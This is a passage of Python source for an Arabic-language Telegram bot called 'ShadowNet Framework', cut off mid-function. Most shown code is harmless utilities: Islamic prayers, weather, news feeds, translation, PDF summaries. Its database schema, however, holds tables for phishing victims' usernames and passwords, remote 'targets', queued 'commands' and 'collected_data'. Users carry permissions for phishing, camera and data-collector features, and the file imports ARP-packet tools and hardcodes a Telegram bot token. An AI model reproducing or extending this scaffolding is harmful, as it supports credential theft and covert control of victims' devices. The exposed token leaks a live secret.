# -*- coding: utf-8 -*-

"""
ShadowNet Framework v9.4 - النسخة المستقرة بالكامل
- إصلاح requirements.txt (builtwithout version)
- حذف num_threads من polling
- إصلاح دوال قاعدة البيانات (is_banned وغيرها)
- إضافة delete_webhook قبل polling
- تحسين Keep-Alive
- إضافة المحتوى الإسلامي (JSON مدمج)
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
import signal

# ===================== استيراد PIL =====================
try:
    from PIL import Image, ImageDraw, ImageFont
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("تنبيه: مكتبة PIL غير مثبتة")

# ===================== استيراد المكتبات الأساسية =====================
try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier
    import dns.resolver
    import whois
    import paramiko
    from scapy.all import ARP, Ether, send, srp
    import yt_dlp
    import pypdf
    from bs4 import BeautifulSoup
    import builtwith
    import googletrans
    from googletrans import Translator
    from gtts import gTTS
    import wikipedia
    import feedparser
except ImportError as e:
    print(f"مكتبة مفقودة: {e}")
    print("يرجى تثبيت المكتبات المطلوبة باستخدام: pip install -r requirements.txt")
    sys.exit(1)

# ===================== الإعدادات الأساسية =====================
TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
ADMIN_ID = 7965377136
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))
API_KEY = secrets.token_hex(32)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')

# ===================== إعدادات Flask =====================
app = Flask(__name__)

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== قاعدة البيانات =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY,
        is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        created_at TEXT,
        last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0,
        can_use_camera INTEGER DEFAULT 0,
        can_use_phishing INTEGER DEFAULT 0,
        can_use_advanced INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (
        chat_id INTEGER PRIMARY KEY,
        token TEXT UNIQUE
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS chat_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        from_user INTEGER,
        to_user INTEGER,
        message TEXT,
        timestamp TEXT,
        is_bot_reply INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        action TEXT,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_state (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS intrusion_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, endpoint TEXT, method TEXT, user_agent TEXT, timestamp TEXT, details TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reminders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        message TEXT,
        remind_time TEXT,
        created_at TEXT,
        is_active INTEGER DEFAULT 1
    )''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_camera INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_phishing INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_advanced INTEGER DEFAULT 0")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced) VALUES (?, 1, 999, ?, 1, 1, 1, 1)", 
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1, can_use_collector = 1, can_use_camera = 1, can_use_phishing = 1, can_use_advanced = 1 WHERE chat_id = ?", (ADMIN_ID,))
    c.execute("INSERT OR IGNORE INTO user_tokens (chat_id, token) VALUES (?, ?)", (ADMIN_ID, secrets.token_urlsafe(16)))
    conn.commit()
    conn.close()

init_db()

# ===================== المحتوى الإسلامي (مدمج كـ JSON) =====================
ISLAMIC_DATA = {
    "adkar_sabah": [
        "أصبحنا وأصبح الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذا اليوم وخير ما بعده، وأعوذ بك من شر ما في هذا اليوم وشر ما بعده، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
        "اللهم بك أصبحنا، وبك أمسينا، وبك نحيا، وبك نموت، وإليك النشور.",
        "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
        "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
    ],
    "adkar_massaa": [
        "أمسينا وأمسى الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذه الليلة وخير ما بعدها، وأعوذ بك من شر ما في هذه الليلة وشر ما بعدها، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
        "اللهم بك أمسينا، وبك أصبحنا، وبك نحيا، وبك نموت، وإليك المصير.",
        "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
        "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
    ],
    "doaa": {
        "سفر": [
            "اللهم إن نسألك في سفرنا هذا البر والتقوى، ومن العمل ما ترضى، اللهم هون علينا سفرنا هذا واطو عنا بعده، اللهم أنت الصاحب في السفر والخليفة في الأهل، اللهم إني أعوذ بك من وعثاء السفر، وكآبة المنظر، وسوء المنقلب في المال والأهل.",
            "سبحان الذي سخر لنا هذا وما كنا له مقرنين، وإنا إلى ربنا لمنقلبون."
        ],
        "هم": [
            "اللهم إني أعوذ بك من الهم والحزن، وأعوذ بك من العجز والكسل، وأعوذ بك من الجبن والبخل، وأعوذ بك من غلبة الدين وقهر الرجال.",
            "لا إله إلا الله العظيم الحليم، لا إله إلا الله رب العرش العظيم، لا إله إلا الله رب السموات ورب الأرض رب العرش الكريم."
        ],
        "رزق": [
            "اللهم اكفني بحلالك عن حرامك، وأغنني بفضلك عمن سواك.",
            "اللهم إني أسألك علماً نافعاً، ورزقاً طيباً، وعملاً متقبلاً.",
            "اللهم رب السموات ورب الأرض ورب العرش العظيم، ربنا ورب كل شيء، فالق الحب والنوى، ومنزل التوراة والإنجيل والفرقان، أعوذ بك من شر كل شيء أنت آخذ بناصيته، اللهم أنت الأول فليس قبلك شيء، وأنت الآخر فليس بعدك شيء، وأنت الظاهر فليس فوقك شيء، وأنت الباطن فليس دونك شيء، اقض عنا الدين وأغننا من الفقر."
        ],
        "نوم": [
            "اللهم باسمك أموت وأحيا.",
            "اللهم أسلمت نفسي إليك، ووجهت وجهي إليك، وفوضت أمري إليك، وألجأت ظهري إليك، رغبة ورهبة إليك، لا ملجأ ولا منجا منك إلا إليك، آمنت بكتابك الذي أنزلت، ونبيك الذي أرسلت."
        ],
        "فرج": [
            "لا إله إلا الله الحليم الكريم، سبحان الله رب العرش العظيم، الحمد لله رب العالمين، أسألك موجبات رحمتك، وعزائم مغفرتك، والغنيمة من كل بر، والسلامة من كل إثم، لا تدع لي ذنباً إلا غفرته، ولا هماً إلا فرجته، ولا حاجة هي لك رضاً إلا قضيتها يا أرحم الراحمين.",
            "اللهم إني عبدك، ابن عبدك، ابن أمتك، ناصيتي بيدك، ماضٍ في حكمك، عدل في قضاؤك، أسألك بكل اسم هو لك، سميت به نفسك، أو أنزلته في كتابك، أو علمته أحداً من خلقك، أو استأثرت به في علم الغيب عندك، أن تجعل القرآن ربيع قلبي، ونور صدري، وجلاء حزني، وذهاب همي."
        ]
    },
    "arkan_islam": "🕌 أركان الإسلام الخمسة:\n\n1. شهادة أن لا إله إلا الله وأن محمداً رسول الله.\n2. إقام الصلاة.\n3. إيتاء الزكاة.\n4. صوم رمضان.\n5. حج البيت لمن استطاع إليه سبيلاً.\n\nوالدليل: عن ابن عمر رضي الله عنهما قال: قال رسول الله ﷺ: «بُني الإسلام على خمس: شهادة أن لا إله إلا الله وأن محمداً رسول الله، وإقام الصلاة، وإيتاء الزكاة، وصوم رمضان، وحج البيت» (متفق عليه).",
    "arkan_iman": "📖 أركان الإيمان الستة:\n\n1. الإيمان بالله.\n2. الإيمان بملائكته.\n3. الإيمان بكتبه.\n4. الإيمان برسله.\n5. الإيمان باليوم الآخر.\n6. الإيمان بالقدر خيره وشره.\n\nوالدليل: قال رسول الله ﷺ: «أن تؤمن بالله، وملائكته، وكتبه، ورسله، واليوم الآخر، وتؤمن بالقدر خيره وشره» (رواه مسلم).",
    "wudu": "💧 خطوات الوضوء الصحيح (من السنة النبوية):\n\n1. النية (في القلب).\n2. التسمية (بسم الله).\n3. غسل الكفين ثلاث مرات.\n4. المضمضة والاستنشاق ثلاث مرات (بغرفة واحدة).\n5. غسل الوجه ثلاث مرات (من منبت الشعر إلى الذقن، ومن الأذن إلى الأذن).\n6. غسل اليدين إلى المرفقين ثلاث مرات (الأيمن ثم الأيسر).\n7. مسح الرأس مرة واحدة (مع الأذنين).\n8. غسل الرجلين إلى الكعبين ثلاث مرات (الأيمن ثم الأيسر).\n9. الدعاء بعد الوضوء: «أشهد أن لا إله إلا الله وحده لا شريك له، وأشهد أن محمداً عبده ورسوله».",
    "ghusl": "🚿 صفة الغسل الكامل (الجنابة) من السنة النبوية:\n\n1. النية (في القلب).\n2. غسل الكفين ثلاث مرات.\n3. غسل الفرج وما حوله.\n4. يتوضأ وضوءه للصلاة (غسل الوجه، اليدين، مسح الرأس، وغسل الرجلين).\n5. يخلل الماء في شعر رأسه حتى يصل إلى أصول الشعر، ثم يفيض الماء على رأسه ثلاث مرات.\n6. يغسل بقية جسده، يبدأ بالشق الأيمن ثم الأيسر، ويدلك جسده بيديه."
}

# ===================== دوال مساعدة لقاعدة البيانات (مؤمنة) =====================
def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        if fetch_one:
            result = c.fetchone()
        else:
            result = c.fetchall()
        conn.close()
        return result if result is not None else default
    except Exception as e:
        logger.error(f"خطأ في قاعدة البيانات: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"خطأ في تنفيذ قاعدة البيانات: {e}")
        return False

# ===================== دوال مساعدة أساسية (مؤمنة) =====================
def is_admin(chat_id):
    row = safe_db_query("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def get_user_points(chat_id):
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_camera(chat_id):
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_phishing(chat_id):
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_advanced(chat_id):
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, amount, reason, datetime.now().isoformat()))

def deduct_points(chat_id, amount, reason):
    points = get_user_points(chat_id)
    if points < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, -amount, reason, datetime.now().isoformat()))
        return True
    return False

def generate_user_token(chat_id):
    token = secrets.token_urlsafe(16)
    safe_db_execute("INSERT OR REPLACE INTO user_tokens (chat_id, token) VALUES (?, ?)", (chat_id, token))
    return token

def get_user_token(chat_id):
    row = safe_db_query("SELECT token FROM user_tokens WHERE chat_id = ?", (chat_id,))
    if row:
        return row[0]
    return generate_user_token(chat_id)

def get_chat_id_by_token(token):
    row = safe_db_query("SELECT chat_id FROM user_tokens WHERE token = ?", (token,))
    if row:
        return row[0]
    return None

def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def get_referral_code(chat_id):
    row = safe_db_query("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
    if row and row[0]:
        return row[0]
    code = generate_referral_code()
    safe_db_execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (code, chat_id))
    return code

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, timeout=60)
    except Exception as e:
        logger.error(f"safe_send error to {chat_id}: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"📢 إشعار: {msg}")

def log_activity(chat_id, action):
    safe_db_execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.now().isoformat()))

def update_last_seen(chat_id):
    safe_db_execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))

# ===================== دوال الصور الترحيبية =====================
def create_welcome_image(user_name):
    if not PIL_AVAILABLE:
        return None
    try:
        img = Image.new('RGB', (800, 400), color=(10, 10, 30))
        draw = ImageDraw.Draw(img)
        for i in range(5):
            color = (50 + i*20, 50 + i*20, 150 + i*20)
            draw.rectangle([i*2, i*2, 800-i*2, 400-i*2], outline=color, width=2)
        try:
            font_large = ImageFont.truetype("arial.ttf", 50)
            font_small = ImageFont.truetype("arial.ttf", 30)
        except:
            font_large = ImageFont.load_default()
            font_small = ImageFont.load_default()
        draw.ellipse([300, 60, 500, 260], outline=(0, 150, 255), width=4)
        draw.ellipse([350, 110, 450, 210], outline=(0, 200, 255), width=2)
        draw.line([400, 60, 400, 40], fill=(0, 150, 255), width=3)
        draw.line([370, 40, 430, 40], fill=(0, 150, 255), width=3)
        draw.text((400, 280), f"مرحباً {user_name}", fill=(200, 200, 255), anchor="mm", font=font_large)
        draw.text((400, 330), "كيان إلكتروني متطور", fill=(100, 150, 255), anchor="mm", font=font_small)
        draw.text((400, 365), "جاهز لخدمتك", fill=(100, 150, 255), anchor="mm", font=font_small)
        path = f"welcome_{int(time.time())}.png"
        img.save(path)
        return path
    except Exception as e:
        logger.error(f"create_welcome_image error: {e}")
        return None

# ===================== دوال الاقتباسات =====================
QUOTES_ARABIC = {
    'حزين': ["الفراق مؤلم ولكن الحياة تستمر", "الوحدة قاسية لكنها تعلمنا الصبر", "الحزن زائر عابر، لا تدعه يسكن قلبك"],
    'عميق': ["الحياة رحلة قصيرة، عشها بوعي", "الروح تتوق إلى ما لا تراه العين", "أعمق الجروح هي التي لا ترى بالعين"],
    'جميل': ["الحب نور يضيء القلوب المظلمة", "الأمل يبقى آخر ما يموت في النفس", "الجمال الحقيقي في الروح الطيبة"]
}

QUOTES_ENGLISH = {
    'sad': ["Goodbye is painful, but life goes on", "Loneliness is harsh, but it teaches patience"],
    'deep': ["Life is a short journey, live it consciously", "The soul yearns for what the eye cannot see"],
    'beautiful': ["Love is a light that illuminates dark hearts", "Hope remains the last thing to die in the soul"]
}

def get_random_quote(lang='arabic', category='sad'):
    if lang == 'arabic':
        quotes_dict = QUOTES_ARABIC
        if category in quotes_dict:
            return "📝 " + random.choice(quotes_dict[category])
        else:
            all_quotes = []
            for cat in quotes_dict.values():
                all_quotes.extend(cat)
            return "📝 " + random.choice(all_quotes)
    else:
        quotes_dict = QUOTES_ENGLISH
        if category in quotes_dict:
            return "📝 " + random.choice(quotes_dict[category])
        else:
            all_quotes = []
            for cat in quotes_dict.values():
                all_quotes.extend(cat)
            return "📝 " + random.choice(all_quotes)

# ===================== دوال النصائح =====================
TIPS = {
    'دراسية': ["خصص وقتاً منتظماً للمذاكرة يومياً", "راجع دروسك قبل النوم لترسيخ المعلومات"],
    'اجتماعية': ["كن صادقاً مع أصدقائك في كل الأوقات", "استمع أكثر مما تتحدث لتتعلم"],
    'للاكتئاب': ["لا تيأس، الحياة جميلة وسوف تشرق شمس جديدة", "اطلب المساعدة من المقربين، لا تتحمل وحدك"],
    'إسلامية': ["توكل على الله في كل أمورك فهو خير وكيل", "أكثر من الاستغفار، فهو يفتح أبواب الرزق"]
}

def get_random_tip(category):
    if category in TIPS:
        return "💡 " + random.choice(TIPS[category])
    else:
        all_tips = []
        for tips in TIPS.values():
            all_tips.extend(tips)
        return "💡 " + random.choice(all_tips)

# ===================== دوال الطقس =====================
def get_weather_detailed(city):
    try:
        url = f"https://wttr.in/{city}?format=%l:+%c+%t+%w+%h+%p+%u&lang=ar"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            raw = resp.text.strip()
            parts = raw.split(',')
            if len(parts) >= 6:
                location = parts[0].strip()
                condition = parts[1].strip()
                temp = parts[2].strip()
                wind = parts[3].strip()
                humidity = parts[4].strip()
                pressure = parts[5].strip()
                msg = f"🌤️ الطقس في {location}:\n\n"
                msg += f"📌 الحالة: {condition}\n"
                msg += f"🌡️ درجة الحرارة: {temp}\n"
                msg += f"💨 الرياح: {wind}\n"
                msg += f"💧 الرطوبة: {humidity}\n"
                msg += f"📊 الضغط الجوي: {pressure}\n"
                now = datetime.now().strftime("%Y-%m-%d %H:%M")
                msg += f"\n🕒 التوقيت: {now}"
                return msg
            else:
                return f"🌤️ الطقس في {city}:\n{raw}"
        else:
            return "فشل جلب الطقس"
    except Exception as e:
        logger.error(f"get_weather_detailed error: {e}")
        return "خطأ في الاتصال بخدمة الطقس"

# ===================== دوال الأخبار =====================
def get_news_without_api(topic='general'):
    try:
        rss_feeds = {
            'general': 'https://www.aljazeera.net/feeds/rss',
            'egypt': 'https://www.youm7.com/RSS',
            'sport': 'http://www.kooora.com/rss.aspx',
            'tech': 'https://www.aitnews.com/feed',
            'economy': 'https://www.alarabiya.net/ar/economy/rss.xml',
        }
        feed_url = rss_feeds.get(topic, rss_feeds['general'])
        feed = feedparser.parse(feed_url)
        articles = []
        if feed.entries:
            for entry in feed.entries[:8]:
                title = entry.get('title', '')
                summary = entry.get('summary', '') or entry.get('description', '')
                link = entry.get('link', '')
                articles.append(f"📌 {title}\n{summary[:200]}...\n🔗 {link}\n")
            if articles:
                return "\n".join(articles)
        return "لا توجد أخبار حالياً"
    except Exception as e:
        logger.error(f"get_news_without_api error: {e}")
        return "حدث خطأ في جلب الأخبار"

# ===================== دوال الترجمة =====================
LANGUAGES = {
    'ar': 'العربية',
    'en': 'الإنجليزية',
    'fr': 'الفرنسية',
    'es': 'الإسبانية',
    'de': 'الألمانية',
    'it': 'الإيطالية',
    'pt': 'البرتغالية',
    'ru': 'الروسية',
    'ja': 'اليابانية',
    'ko': 'الكورية',
    'zh-cn': 'الصينية المبسطة',
    'hi': 'الهندية',
    'tr': 'التركية',
    'fa': 'الفارسية',
    'ur': 'الأردية',
}

def translate_text_advanced_with_lang(text, target_lang='ar'):
    try:
        translator = Translator()
        detected = translator.detect(text)
        translated = translator.translate(text, dest=target_lang)
        chunks = []
        chunk_size = 4000
        for i in range(0, len(translated.text), chunk_size):
            chunks.append(translated.text[i:i+chunk_size])
        return chunks, detected.lang, LANGUAGES.get(detected.lang, detected.lang), LANGUAGES.get(target_lang, target_lang)
    except Exception as e:
        return [text], 'unknown', 'غير معروف', 'غير معروف'

# ===================== دوال Wikipedia =====================
def advanced_wikipedia_search(query):
    try:
        wikipedia.set_lang("ar")
        results = wikipedia.search(query, results=10)
        if not results:
            return "لم يتم العثور على نتائج"
        summaries = []
        for title in results[:3]:
            try:
                page = wikipedia.page(title)
                summary = page.summary[:500] + "..."
                summaries.append(f"📌 {title}\n{summary}\n")
            except:
                summaries.append(f"📌 {title}\n(لا يمكن جلب الملخص)\n")
        return "\n".join(summaries)
    except:
        return "حدث خطأ في البحث"

# ===================== دوال الخدمات العامة =====================
def password_generator(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(chars) for _ in range(length))
    return password

def password_strength(password):
    score = 0
    length = len(password)
    if length >= 8:
        score += 1
    if length >= 12:
        score += 1
    if re.search(r'[a-z]', password):
        score += 1
    if re.search(r'[A-Z]', password):
        score += 1
    if re.search(r'\d', password):
        score += 1
    if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        score += 1
    if score <= 2:
        strength = "ضعيفة جداً"
        crack_time = "أقل من ثانية"
    elif score <= 4:
        strength = "ضعيفة"
        crack_time = "بضع ثوانٍ"
    elif score <= 5:
        strength = "متوسطة"
        crack_time = "ساعات"
    elif score <= 6:
        strength = "قوية"
        crack_time = "أيام"
    else:
        strength = "قوية جداً"
        crack_time = "سنوات"
    return strength, crack_time, score

def text_to_speech(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        filename = f"tts_{int(time.time())}.mp3"
        filepath = os.path.join('temp', filename)
        os.makedirs('temp', exist_ok=True)
        tts.save(filepath)
        return filepath
    except Exception as e:
        return None

# ===================== دوال فحص الرابط =====================
def check_link_safety_advanced(url, chat_id):
    if not deduct_points(chat_id, 5, "فحص رابط"):
        return "رصيدك من النقاط لا يكفي (تحتاج 5 نقاط)"
    
    result = {
        'url': url,
        'safe': True,
        'risk_level': 'آمن',
        'threats': [],
        'details': {},
        'recommendations': []
    }
    try:
        parsed = urlparse(url)
        domain = parsed.netloc
        if not domain:
            domain = url.split('/')[0]

        if not url.startswith('https://'):
            result['safe'] = False
            result['threats'].append({
                'type': 'HTTP',
                'severity': 'عالٍ',
                'description': 'الرابط غير مشفر (HTTP)، مما يعرض البيانات للاعتراض (MITM).'
            })
            result['recommendations'].append('استخدم HTTPS دائماً لحماية البيانات.')
        else:
            result['details']['https'] = 'مفعل'

        shortened_domains = ['bit.ly', 'tinyurl.com', 'goo.gl', 'ow.ly', 'is.gd', 'cli.gs', 'short.link', 'cut.ly', 'rebrand.ly']
        if any(sd in domain for sd in shortened_domains):
            result['safe'] = False
            result['threats'].append({
                'type': 'Shortened URL',
                'severity': 'متوسط',
                'description': f'الرابط مختصر عبر {domain}. الروابط المختصرة تستخدم غالباً لإخفاء وجهات خبيثة.'
            })
            result['recommendations'].append('استخدم أدوات فك اختصار الروابط لمعرفة الوجهة الحقيقية.')

        suspicious_keywords = ['phishing', 'malware', 'virus', 'scam', 'fraud', 'fake', 'hack', 'crack', 'keygen', 'serial', 'login', 'verify', 'secure', 'update', 'confirm', 'verification', 'validate', 'authenticate']
        for keyword in suspicious_keywords:
            if keyword in domain.lower() or keyword in url.lower():
                result['safe'] = False
                result['threats'].append({
                    'type': 'Suspicious Keyword',
                    'severity': 'عالٍ',
                    'description': f'تم العثور على كلمة مشبوهة "{keyword}" في الرابط، مما يشير إلى احتمالية الاحتيال.'
                })
                result['recommendations'].append('تجنب فتح الروابط التي تحتوي على كلمات مثل login, verify, secure إلا من مصادر موثوقة.')
                break

        if result['safe']:
            result['risk_level'] = 'آمن'
        elif len(result['threats']) >= 2:
            result['risk_level'] = 'خطير'
        else:
            result['risk_level'] = 'مشبوه'
    except Exception as e:
        result['safe'] = False
        result['threats'].append({
            'type': 'Error',
            'severity': 'متوسط',
            'description': f'حدث خطأ أثناء الفحص: {str(e)[:100]}'
        })
        result['risk_level'] = 'غير معروف'
    return result

def format_link_report(result):
    msg = f"🔍 تقرير فحص الرابط\n\n"
    msg += f"📎 الرابط: {result['url']}\n"
    msg += f"🛡️ الحالة: {'✅ آمن' if result['safe'] else '❌ غير آمن'}\n"
    msg += f"⚠️ مستوى الخطر: {result['risk_level']}\n\n"
    if result['threats']:
        msg += "🚨 التهديدات المكتشفة:\n"
        for threat in result['threats']:
            msg += f"• {threat['type']} (خطورة: {threat['severity']})\n"
            msg += f"  {threat['description']}\n"
    else:
        msg += "✅ لم يتم اكتشاف أي تهديدات\n"
    if result['recommendations']:
        msg += "\n💡 توصيات:\n"
        for rec in result['recommendations']:
            msg += f"• {rec}\n"
    return msg

# ===================== دوال تحليل PDF =====================
def extract_pdf_text(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def summarize_pdf_text(text, max_sentences=6):
    if not text:
        return "لم يتم استخراج أي نص من الملف"
    sentences = re.split(r'[.!?]', text)
    sentences = [s.strip() for s in sentences if len(s.strip()) > 20]
    if len(sentences) <= max_sentences:
        return text[:1000] + "..."
    words = re.findall(r'\b\w+\b', text.lower())
    word_freq = {}
    for w in words:
        if len(w) > 3:
            word_freq[w] = word_freq.get(w, 0) + 1
    scored_sentences = []
    for s in sentences:
        score = sum(word_freq.get(w, 0) for w in re.findall(r'\b\w+\b', s.lower()))
        scored_sentences.append((score, s))
    scored_sentences.sort(reverse=True)
    summary_sentences = [s for _, s in scored_sentences[:max_sentences]]
    return '. '.join(summary_sentences) + '.'

def smart_pdf_search(text, question):
    if not text:
        return "لم يتم تحميل أي نص"
    paragraphs = text.split('\n\n')
    paragraphs = [p.strip() for p in paragraphs if len(p.strip()) > 50]
    question_lower = question.lower()
    keywords = re.findall(r'\b\w+\b', question_lower)
    keywords = [w for w in keywords if len(w) > 3]
    scored_paragraphs = []
    for para in paragraphs:
        para_lower = para.lower()
        score = sum(1 for kw in keywords if kw in para_lower)
        if score > 0:
            scored_paragraphs.append((score, para))
    scored_paragraphs.sort(reverse=True)
    if scored_paragraphs:
        best_para = scored_paragraphs[0][1]
        if len(scored_paragraphs) > 1 and scored_paragraphs[1][0] > scored_paragraphs[0][0] * 0.5:
            best_para += "\n\n" + scored_paragraphs[1][1]
        answer = f"الإجابة:\n\n{best_para[:1500]}"
        if len(best_para) > 1500:
            answer += "\n\n...(تم اختصار الإجابة للطول)"
        return answer
    else:
        return "لم يتم العثور على إجابة مناسبة في الملف"

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
